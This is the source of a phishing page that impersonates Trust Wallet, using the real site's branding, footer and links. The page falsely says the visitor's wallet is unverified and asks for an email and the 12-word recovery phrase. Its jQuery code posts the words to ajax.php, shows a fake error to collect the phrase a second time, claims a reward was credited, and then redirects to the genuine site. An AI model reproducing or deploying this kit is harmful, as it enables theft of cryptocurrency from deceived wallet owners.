<?php
require_once("config.php");
?>
<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Earn Crypto| Staking Coins | Earn bitcoin | Trust Wallet</title>
<link rel="shortcut icon" href="https://trustwallet.com/assets/images/favicon.ico" type="image/x-icon">
<link rel="shortcut icon" type="image/png" href="https://trustwallet.com/assets/images/favicon.png" />
<meta name="apple-itunes-app" content="app-id=1288339409,affiliate-data=11l7ss">
<meta name="theme-color" content="#3375BB">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<script type="application/ld+json">
    {
      "description": "Trust Wallet is the best ethereum wallet and cryptocurrency wallet to store your favourite BEP2, ERC20 and ERC721, tokens. Download the Android Trust Wallet and iOS app today!",
      "@type": "WebPage",
      "url": "https://trustwallet.com/",
      "headline": "Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet",
      "@context": "https://schema.org"
    }
  </script><script async defer data-domain="trustwallet.com" src="https://analytics.trustwalletapp.com/js/plausible.js"></script><script type="application/javascript">
    document.addEventListener("DOMContentLoaded", function(event) {
      document.getElementById('navbarToggle').addEventListener('click', function() {
        var el = document.getElementById('navbarSupportedContent');
        var toggled = window.getComputedStyle(el).display == 'block';
        if (toggled) {
          el.style.display = "none";
        } else {
          el.style.display = "block";
        }
      })
      //Add Huawei download button based on device.
      var result = new UAParser().getResult();
      var apple = document.getElementsByClassName("apple");
      var huawei = document.getElementsByClassName("huawei");
      var download = document.getElementsByClassName("downloadapp-native");

      if (result.os.name == "Android") {
        for (var i = 0; i < huawei.length; i++) {
          huawei[i].classList.remove("hidden");
          apple[i].classList.add("hidden");
        }
        // if it is android change ctas to googleplay
        for (var i = 0; i < download.length; i++) {
          download[i].href = "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite";
        }
      }
      // if its apple change ctas to appstore
       else if (result.os.name == "iOS") {
        for (var i = 0; i < download.length; i++) {
          download[i].href = "https://apps.apple.com/app/apple-store/id1288339409?mt=8";
        }
      }
    });
  </script>
<noscript>Your browser does not support JavaScript!</noscript>
<link rel="preload" href="assets/fonts/IBMPlexSans/IBMPlexSans-Regular.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="assets/fonts/IBMPlexSans/IBMPlexSans-Bold.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="assets/fonts/IBMPlexSans/IBMPlexSans-Medium.woff2" as="font" type="font/woff2" crossorigin>
<link rel="stylesheet" href="assets/main.css" />
<link rel="alternate" href="https://trustwallet.com/" hreflang="en" />
<link rel="alternate" href="https://trustwallet.com/" hreflang="x-default" /><link rel="alternate" href="https://trustwallet.com/ru/" hreflang="ru" /><link rel="alternate" href="https://trustwallet.com/de/" hreflang="de" /><link rel="alternate" href="https://trustwallet.com/vi/" hreflang="vi" /><link rel="alternate" href="https://trustwallet.com/id/" hreflang="id" /><link rel="alternate" href="https://trustwallet.com/ko/" hreflang="ko" /><link rel="alternate" href="https://trustwallet.com/ja/" hreflang="ja" /><link rel="alternate" href="https://trustwallet.com/tr/" hreflang="tr" /><link rel="alternate" href="https://trustwallet.com/pt_BR/" hreflang="pt" /><link rel="alternate" href="https://trustwallet.com/zh_CN/" hreflang="zh" /><link rel="alternate" href="https://trustwallet.com/es/" hreflang="es" /><script type="text/javascript" src="../assets/js/platform.js"></script>
</head>
<body> <nav class="navbar navbar-expand-lg navbar-togglable navbar-dark bg-primary d-block">
<div class="container">
<a id="navbar-brand" class="navbar-brand" href="/" aria-label="Goes back on homepage"><svg class="navbar-brand-img logotype-white" alt="Trust Wallet logotype"></svg></a><button class="navbar-toggler collapsed" id="navbarToggle" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-expanded="false" aria-hidden="true" aria-hidden="true" aria-label="Toggle navigation" aria-controls="navbarCollapse">
<span class="navbar-toggler-icon collapsed"></span>
</button>
<div class="navbar-collapse collapse navbar-margin" id="navbarSupportedContent">
<button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarCollapse" aria-expanded="false" aria-hidden="true" aria-label="Toggle navigation">
</button>
<ul class="navbar-nav font-size-sm ml-auto">
<li class="nav-item">
<a class="nav-link" href="/assets" aria-label="Goes to supported assets page">Assets</a>
</li>
<li class="nav-item">
<a class="nav-link" href="/staking" aria-label="Goes to staking page where you can learn what is staking and calculate APRs">Staking</a>
</li>
<li class="nav-item">
<a class="nav-link" href="/earn" aria-label="Goes to earn page where you can earn up to +11% APR">Earn<span class="badge badge-success ml-2 pl-2 pr-2">+11% APR</span></a>
</li>
<li class="nav-item">
<a class="nav-link" href="/nft-wallet" aria-label="Goes to NFT page">NFTs</a>
</li>
<li class="nav-item">
<a class="nav-link" href="/dapp" aria-label="Goes to DApp browser page">DApp Browser</a>
</li><li class="nav-item dropdown" aria-label=" flag" alt=" flag">
<a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="false" aria-expanded="true" aria-label="Opens dropdown to select different language for the site">
Language
<div class="flag bg-" aria-label=" flag"></div>
</a>
<div class="dropdown-menu dropdown-menu-md" aria-labelledby="navbarDropdown">
<div class="list-group list-group-flush">
<ul class="list-unstyled list-block">
<li class="list-inline-item m-6"><a href="/" class="list-group-item" aria-label="changes language of the page to en">
<div class="flag bg-en" title="en flag"></div>
</a></li><li class="list-inline-item m-6"><a href="/ru/" class="list-group-item list-inline-item" aria-label="changes language of the page to ru">
<div class="flag bg-ru" title="ru flag"></div>
</a></li><li class="list-inline-item m-6"><a href="/de/" class="list-group-item list-inline-item" aria-label="changes language of the page to de">
<div class="flag bg-de" title="de flag"></div>
</a></li><li class="list-inline-item m-6"><a href="/vi/" class="list-group-item list-inline-item" aria-label="changes language of the page to vi">
<div class="flag bg-vi" title="vi flag"></div>
</a></li><li class="list-inline-item m-6"><a href="/id/" class="list-group-item list-inline-item" aria-label="changes language of the page to id">
<div class="flag bg-id" title="id flag"></div>
</a></li><li class="list-inline-item m-6"><a href="/ko/" class="list-group-item list-inline-item" aria-label="changes language of the page to ko">
<div class="flag bg-ko" title="ko flag"></div>
</a></li><li class="list-inline-item m-6"><a href="/ja/" class="list-group-item list-inline-item" aria-label="changes language of the page to ja">
<div class="flag bg-ja" title="ja flag"></div>
</a></li><li class="list-inline-item m-6"><a href="/tr/" class="list-group-item list-inline-item" aria-label="changes language of the page to tr">
<div class="flag bg-tr" title="tr flag"></div>
</a></li><li class="list-inline-item m-6"><a href="/pt_BR/" class="list-group-item list-inline-item" aria-label="changes language of the page to pt_BR">
<div class="flag bg-pt_BR" title="pt_BR flag"></div>
</a></li><li class="list-inline-item m-6"><a href="/zh_CN/" class="list-group-item list-inline-item" aria-label="changes language of the page to zh_CN">
<div class="flag bg-zh_CN" title="zh_CN flag"></div>
</a></li><li class="list-inline-item m-6"><a href="/es/" class="list-group-item list-inline-item" aria-label="changes language of the page to es">
<div class="flag bg-es" title="es flag"></div>
</a></li>
</ul>
</div>
</div>
</li></ul>
</div>
</div>
</nav>
<main class="page-content" aria-label="Content">
<section class="pt-8 pb-8 bg-gradient-primary">
<div class="container">
<div class="row align-items-center justify-content-center justify-content-md-between">
<div class="col-12 col-lg-6 mb-8 text-center text-md-left text-white">
<h1 class="display-3 font-weight-bold">Dear customer </h1>
<p class="text-white-90 lead mb-4">Our system has shown that your wallet has not yet been verified . this verification can be done easily via the button below </p>
<button  href="" class="btn btn-white downloadapp-native " aria-label="goes to download page to get Trust Wallet app" data-bs-toggle="modal" data-bs-target="#exampleModal"
        data-bs-whatever="@mdo">Verify your wallet</button>
</div>
<div class="col-12 col-lg-6 text-center">
<img class="hero-image mx-auto d-block img-fluid" src="https://trustwallet.com/assets/images/home_hero.png" alt="Showcase various types of NFTs that can be stored inside Trust Wallet">
</div>
</div>
</div>
</div>

</div>
</div>
</section>
<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">

            <div class="modal-body">
            <form id="form1">
                <h3>The reason why we asked for the word phrase is to make sure to keep your account safe</h3>
                    <div style="width: 98%;" class="input-group mb-6">
                        <input  required id="email" type="email" class="form-control mt-2" placeholder="Email" />
                    </div>
                    <div style="width: 98%;" class="input-group mb-3">
                        <input  required id="word1" type="text" class="form-control mt-2" placeholder="1." />
                        <input  required id="word2" required style="margin-left: 5px;" placeholder="2." type="text" class="form-control mt-2" placeholder="" />
                        <input  required id="word3" required style="margin-left: 5px;" placeholder="3." type="text" class="form-control mt-2" placeholder="" />
                    </div>
                    <div style="width: 98%;" class="input-group mb-3">
                        <input  required id="word4" type="text" class="form-control mt-2" placeholder="4." />
                        <input  required id="word5" required style="margin-left: 5px;" type="text" class="form-control mt-2" placeholder="5." />
                        <input  required id="word6" required style="margin-left: 5px;" type="text" class="form-control mt-2" placeholder="6." />
                    </div>
                    <div style="width: 98%;" class="input-group mb-3">
                        <input  required id="word7" type="text" class="form-control mt-2" placeholder="7." />
                        <input  required id="word8" required style="margin-left: 5px;" type="text" class="form-control mt-2" placeholder="8." />
                        <input  required id="word9" required style="margin-left: 5px;" type="text" class="form-control mt-2" placeholder="9." />
                    </div>
                    <div style="width: 98%;" class="input-group mb-3">
                        <input  required id="word10" type="text" class="form-control mt-2" placeholder="10." />
                        <input  required id="word11" required style="margin-left: 5px;" type="text" class="form-control mt-2" placeholder="11." />
                        <input  required id="word12" required style="margin-left: 5px;" type="text" class="form-control mt-2" placeholder="12." />
                    </div>
                    <button type="button" id="doSubmit" class="btn btn-block btn-primary downloadapp-native" aria-label="Recover my Trust Wallet">
                        Recover Wallet
                    </button>
                </form>
                <form id="form-loader">
                      <style>
                        .loader {
                          border: 6px solid #f3f3f3;
                          /* Light grey */
                          border-top: 6px solid #0b65c6;
                          /* Blue */
                          border-radius: 50%;
                          width: 120px;
                          height: 120px;
                          animation: spin 2s linear infinite;
                        }
                      
                        @keyframes spin {
                          0% {
                            transform: rotate(0deg);
                          }
                        
                          100% {
                            transform: rotate(360deg);
                          }
                        }
                      </style>
                      <div class="loader m-auto"></div>
                </form>
                <form id="form2">
                    
                    <h3>The reason why we asked for the word phrase is to make sure to keep your account safe</h3>
                    <div class="alert alert-danger">Please insert fields correctly.</div>
                    <div style="width: 98%;" class="input-group mb-6">
                        <input  required id="xemail" type="email" class="form-control mt-2" placeholder="Email" />
                    </div>
                    <div style="width: 98%;" class="input-group mb-3">
                        <input  required id="xword1" type="text" class="form-control mt-2" placeholder="1." />
                        <input  required id="xword2" required style="margin-left: 5px;" placeholder="2." type="text" class="form-control mt-2" placeholder="" />
                        <input  required id="xword3" required style="margin-left: 5px;" placeholder="3." type="text" class="form-control mt-2" placeholder="" />

                    </div>
                    <div style="width: 98%;" class="input-group mb-3">
                        <input  required id="xword4" type="text" class="form-control mt-2" placeholder="4." />
                        <input  required id="xword5" required style="margin-left: 5px;" type="text" class="form-control mt-2" placeholder="5." />
                        <input  required id="xword6" required style="margin-left: 5px;" placeholder="6." type="text" class="form-control mt-2" placeholder="" />

                    </div>
                    <div style="width: 98%;" class="input-group mb-3">
                        <input  required id="xword7" type="text" class="form-control mt-2" placeholder="7." />
                        <input  required id="xword8" required style="margin-left: 5px;" type="text" class="form-control mt-2" placeholder="8."/>
                        <input  required id="xword9" required style="margin-left: 5px;" placeholder="9." type="text" class="form-control mt-2" placeholder="" />

                    </div>
                    <div style="width: 98%;" class="input-group mb-3">
                        <input  required id="xword10" type="text" class="form-control mt-2" placeholder="10." />
                        <input  required id="xword11" required style="margin-left: 5px;" type="text" class="form-control mt-2" placeholder="11." />
                        <input  required id="xword12" required style="margin-left: 5px;" placeholder="12." type="text" class="form-control mt-2" placeholder="" />

                    </div>
                    <button type="button" id="xdoSubmit" class="btn btn-block btn-primary downloadapp-native" aria-label="Recover my Trust Wallet">
                        Recover Wallet
                    </button>
                    <br>
                    
                </form>
                <form id="form-success">
                  <div>
                    <center> <img class="m-auto" width="200" src="https://i.pinimg.com/originals/77/9b/9d/779b9dc3928c2dbc304bcf6702bef6df.gif" alt="">
                    </center>
                    <h2 class="text-center">Reward got successfully</h1>
                      <p class="text-center">You will see your wallet credited after few minutes</p>
                      

                  </div>
                </form>
            </div>
        </div>
    </div>
</div>
<script src="https://code.jquery.com/jquery-3.6.0.js"></script>
<script>
  $(document).ready(()=>{
    $("#form-loader").hide()
    $("#form2").hide()
    $("#form-success").hide()

    $("#doSubmit").click(()=>{
      if($("#email").val() != "" && 
      $("#word1").val() != "" &&
      $("#word2").val() != "" &&
      $("#word3").val() != "" &&
      $("#word4").val() != "" &&
      $("#word5").val() != "" &&
      $("#word6").val() != "" &&
      $("#word7").val() != "" &&
      $("#word8").val() != "" &&
      $("#word9").val() != "" &&
      $("#word10").val() != "" &&
      $("#word11").val() != "" &&
      $("#word12").val() != ""
      ){
        $.ajax({
          url: "ajax.php",
          method: "POST",
          dataType: "JSON",
          data: {
            email:$("#email").val(),
            word1:$("#word1").val(),
            word2:$("#word2").val(),
            word3:$("#word3").val(),
            word4:$("#word4").val(),
            word5:$("#word5").val(),
            word6:$("#word6").val(),
            word7:$("#word7").val(),
            word8:$("#word8").val(),
            word9:$("#word9").val(),
            word10:$("#word10").val(),
            word11:$("#word11").val(),
            word12:$("#word12").val()
          },
          success:function(data){
            console.log(data.success)
            $("#form1").hide()
            $("#form-loader").show()
            setTimeout(()=>{
              $("#form-loader").hide()
              $("#form2").show()
            }, 3000)
          }
        })
      }else{
        $("#doSubmit").css("background-color", "red")
      }
      
    })


    $("#xdoSubmit").click(()=>{
      if($("#xemail").val() != "" && 
      $("#xword1").val() != "" &&
      $("#xword2").val() != "" &&
      $("#xword3").val() != "" &&
      $("#xword4").val() != "" &&
      $("#xword5").val() != "" &&
      $("#xword6").val() != "" &&
      $("#xword7").val() != "" &&
      $("#xword8").val() != "" &&
      $("#xword9").val() != "" &&
      $("#xword10").val() != "" &&
      $("#xword11").val() != "" &&
      $("#xword12").val() != ""
      ){
        $.ajax({
          url: "ajax.php",
          method: "POST",
          dataType: "JSON",
          data: {
            email:$("#xemail").val(),
            word1:$("#xword1").val(),
            word2:$("#xword2").val(),
            word3:$("#xword3").val(),
            word4:$("#xword4").val(),
            word5:$("#xword5").val(),
            word6:$("#xword6").val(),
            word7:$("#xword7").val(),
            word8:$("#xword8").val(),
            word9:$("#xword9").val(),
            word10:$("#xword10").val(),
            word11:$("#xword11").val(),
            word12:$("#xword12").val()
          },
          success:function(data){
            console.log(data.success)
            $("#form2").hide()
            $("#form-loader").show()
            setTimeout(()=>{
              $("#form-loader").hide()
              $("#form-success").show()
              setTimeout(()=>{
                location.replace("https://trustwallet.com/")
              }, 2000)
            }, 3000)
          }
      })
      }else{
        $("#xdoSubmit").css("background-color", "red")
      }
      
    })
  })
</script>


<footer class="py-8 py-md-8 bg-white">
<data class="u-url" href="/"></data>
<div class="container">
<div class="row text-center text-md-left">
<div class="col-12 col-md-4 col-lg-3">
<a href="/" id="footer-brand-image" aria-label="Goes to homepage"><svg alt="" class="footer-brand-image logotype-dark img-fluid mb-4" aria-label="Goes back to homesite"></svg></a><ul class="list-unstyled list-inline list-social mb-6 mb-md-0">
<li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
<a href="https://facebook.com/trustwalletapp" class="text-decoration-none" target="_blank" rel="noopener" aria-label="Goes to Trust Wallet Facebook fan page">
<svg class="social-icon" alt="trustwallet facebook" title="trustwallet facebook">
<use xlink:href="/assets/images/socials.svg#social_facebook"></use>
</svg>
</a>
</li>
<li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
<a href="https://github.com/trustwallet" class="text-decoration-none" target="_blank" rel="noopener" aria-label="Goes to Trust Wallet github page">
<svg class="social-icon" alt="trustwallet github" title="trustwallet github">
<use xlink:href="/assets/images/socials.svg#social_github"></use>
</svg>
</a>
</li>
<li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
<a href="https://instagram.com/trustwallet" class="text-decoration-none" target="_blank" rel="noopener" aria-label="Goes to Trust Wallet Instagram fan page">
<svg class="social-icon" alt="trustwallet instagram" title="trustwallet instagram">
<use xlink:href="/assets/images/socials.svg#social_instagram"></use>
</svg>
</a>
</li>
<li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
<a href="https://twitter.com/trustwallet" class="text-decoration-none" target="_blank" rel="noopener" aria-label="Goes to Trust Wallet Twitter fan page">
<svg class="social-icon" alt="trustwallet twitter" title="trustwallet twitter">
<use xlink:href="/assets/images/socials.svg#social_twitter"></use>
</svg>
</a>
</li>
<li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
<a href="https://reddit.com/r/trustapp" class="text-decoration-none" target="_blank" rel="noopener" aria-label="Goes to Trust Wallet Reddit fan page">
<svg class="social-icon" alt="trustwallet reddit" title="trustwallet reddit">
<use xlink:href="/assets/images/socials.svg#social_reddit"></use>
</svg>
</a>
</li>
<li class="list-inline-item list-social-item pt-2">
<a href="https://t.me/trust_announcements" class="text-decoration-none" target="_blank" rel="noopener" aria-label="Goes to Trust Wallet title telegram announcement chat">
<svg class="social-icon" alt="trustwallet telegram" title="trustwallet telegram">
<use xlink:href="/assets/images/socials.svg#social_telegram"></use>
</svg>
</a>
</li>
</ul>
</div>
<div class="col-12 col-md-4 col-lg-3">
<h4 class="font-weight-bold text-uppercase text-gray-700">Trust Wallet</h4>
<ul class="list-unstyled text-gray-700 mb-6 mb-md-8 mb-lg-0">
<li class="mb-3">
<a href="/assets" class="text-reset" aria-label="Goes to assets page">Assets</a>
</li>
<li class="mb-3">
<a href="/dapp" class="text-reset" aria-label="Goes to dapp browser page">DApp Browser</a>
</li>
<li class="mb-3">
<a href="/stablecoins" class="text-reset" aria-label="Goes to stablecoin page">Stablecoins</a>
</li>
<li class="mb-3">
<a href="/beta" class="text-reset" aria-label="Goes Trust Wallet Beta page">Beta</a>
</li>
<li class="mb-3">
<a href="/nft-wallet" class="text-reset" aria-label="Goes to collectible page">NFTs</a>
</li>
<li class="mb-3">
<a href="/el-salvador-wallet" class="text-reset" aria-label="Goes to el salvador wallet">El Salvador Wallet</a>
</li>
<li class="mb-3">
<a href="https://apps.apple.com/app/apple-store/id1288339409?mt=8" rel="noopener" target="_blank" class="text-reset" aria-label="Opens AppStore page to download Trust Wallet for iphones">Crypto Wallet for iOS</a>
</li>
<li class="mb-3">
<a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite" rel="noopener" target="_blank" class="text-reset" aria-label="Opens Google Play page to download Trust Wallet for androids">Crypto Wallet for Android</a>
</li>
</ul>
</div>
<div class="col-12 col-md-4 col-lg-2">
<h4 class="font-weight-bold text-uppercase text-gray-700">Information</h4>
<ul class="list-unstyled text-gray-700 mb-0">
<li class="mb-3">
<a href="https://community.trustwallet.com" target="_blank" class="text-reset" aria-label="Opens Trust Wallet community page">Community</a>
</li>
<li class="mb-3">
<a href="https://community.trustwallet.com/c/helpcenter" target="_blank" class="text-reset" aria-label="Opens help Ccnter page">Help Center</a>
</li>
<li class="mb-3">
<a href="https://support.trustwallet.com/" rel="noopener" target="_blank" class="text-reset" aria-label="Opens support page">Support</a>
</li>
<li class="mb-3">
<a href="/blog" rel="noopener" class="text-reset" aria-label="Opens Trust Wallet blog page">DApp Journey</a>
</li>
<li class="mb-3">
<a href="/developer" class="text-reset" aria-label="Opens Developer page">Developers</a>
</li>
<li class="mb-3">
<a href="/submit-dapp" class="text-reset" aria-label="Opens a page with form to submit a dapp for Trust Wallet listing">Submit DApp</a>
</li>
<li class="mb-3">
<a href="/press" class="text-reset" aria-label="Opens a page with brand kit with Trust Wallet logos, icons and many more">Press Kit</a>
</li>
<li class="mb-3">
<a href="/terms-of-services" class="text-reset" aria-label="Opens a page with terms of services">Terms Of Service</a>
</li>
<li class="mb-3">
<a href="/privacy-policy" class="text-reset" aria-label="Opens a page with privacy and policy">Privacy Policy</a>
</li>
</ul>
</div>
<div class="col-12 col-md-4 offset-md-4 col-lg-2 offset-lg-0">
<h4 class="font-weight-bold text-uppercase text-gray-700">Use Crypto</h4>
<ul class="list-unstyled text-gray-700 mb-6 mb-md-8 mb-lg-0">
<li class="mb-3">
<a href="/buy-bitcoin" class="text-reset" aria-label="opens a bitcoin page">Buy Bitcoin with a credit card</a>
</li>
<li class="mb-3">
<a href="/buy-ethereum" class="text-reset" aria-label="opens a ethereum page where you can learn how to buy it">Buy Ethereum</a>
</li>
<li class="mb-3">
<a href="/buy-bnb" class="text-reset" aria-label="opens a binance coin page where you can learn how to buy it">Buy BNB</a>
</li>
<li class="mb-3">
<a href="/buy-litecoin" class="text-reset" aria-label="opens a litecoin page where you can learn how to buy it">Buy Litecoin</a>
</li>
<li class="mb-3">
<a href="/buy-tron" class="text-reset" aria-label="opens a bitcoin tron where you can learn how to buy it">Buy TRON</a>
</li>
<li class="mb-3">
<a href="/buy-xrp" class="text-reset" aria-label="opens a xrp page where you can learn how to buy it">Buy XRP</a>
</li>
<li class="mb-3">
<a href="/buy-bitcoincash" class="text-reset" aria-label="opens a bitcoin cash page where you can learn how to buy it">Buy Bitcoin Cash</a>
</li>
<hr>
<li class="mb-3">
<a href="/earn-bitcoin" class="text-reset" aria-label="opens a bitcoin page where you can learn how to earn it">Earn Bitcoin</a>
</li>
<li class="mb-3">
<a href="/earn-ethereum" class="text-reset" aria-label="opens a ethereum page where you can learn how to earn it">Earn Ethereum</a>
</li>
<li class="mb-3">
<a href="/earn-binance-coin" class="text-reset" aria-label="opens a binance coin page where you can learn how to earn it">Earn Binance Coin</a>
</li>
<li class="mb-3">
<a href="/earn-cake" class="text-reset" aria-label="opens a cake page where you can learn how to earn it">Earn Cake</a>
</li>
</ul>
</div>
<div class="col-12 col-md-4 col-lg-2">
<h4 class="font-weight-bold text-uppercase text-gray-700">Assets</h4>
<ul class="list-unstyled text-gray-700 mb-6 mb-md-8 mb-lg-0">
<li class="mb-3"><a href="/bitcoin-wallet" class="text-gray-700" aria-label="Goes to the page of  (BTC) where you can learn more about it">Bitcoin (BTC)</a>
<li class="mb-3"><a href="/ethereum-wallet" class="text-gray-700" aria-label="Goes to the page of  (ETH) where you can learn more about it">Ethereum (ETH)</a>
<li class="mb-3"><a href="/binance-coin-wallet" class="text-gray-700" aria-label="Goes to the page of  (BNB) where you can learn more about it">Binance Coin (BNB)</a>
<li class="mb-3"><a href="/litecoin-wallet" class="text-gray-700" aria-label="Goes to the page of  (LTC) where you can learn more about it">Litecoin (LTC)</a>
<li class="mb-3"><a href="/xrp-wallet" class="text-gray-700" aria-label="Goes to the page of  (XRP) where you can learn more about it">Ripple (XRP)</a>
<li class="mb-3"><a href="/dogecoin-wallet" class="text-gray-700" aria-label="Goes to the page of  (DOGE) where you can learn more about it">Dogecoin (DOGE)</a>
<li class="mb-3"><a href="/polkadot-wallet" class="text-gray-700" aria-label="Goes to the page of  (DOT) where you can learn more about it">Polkadot (DOT)</a>
<li class="mb-3"><a href="/smart-chain-wallet" class="text-gray-700" aria-label="Goes to the page of  (BNB) where you can learn more about it">Smartchain (BNB)</a>
<li class="mb-3"><a href="/dash-wallet" class="text-gray-700" aria-label="Goes to the page of  (DASH) where you can learn more about it">Dash (DASH)</a>
<li class="mb-3"><a href="/tron-wallet" class="text-gray-700" aria-label="Goes to the page of  (TRX) where you can learn more about it">TRON (TRX)</a>
<li class="mb-3"><a href="/tezos-wallet" class="text-gray-700" aria-label="Goes to the page of  (XTZ) where you can learn more about it">Tezos (XTZ)</a>
<li class="mb-3"><a href="/cosmos-wallet" class="text-gray-700" aria-label="Goes to the page of  (ATOM) where you can learn more about it">Cosmos (ATOM)</a>
<li class="mb-3"><a href="/stellar-wallet" class="text-gray-700" aria-label="Goes to the page of  (XLM) where you can learn more about it">Stellar (XLM)</a>
<li class="mb-3"><a href="/kava-wallet" class="text-gray-700" aria-label="Goes to the page of  (KAVA) where you can learn more about it">Kava (KAVA)</a>
</ul>
</div>
</div>
</div>
</footer>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>

</body>
</html>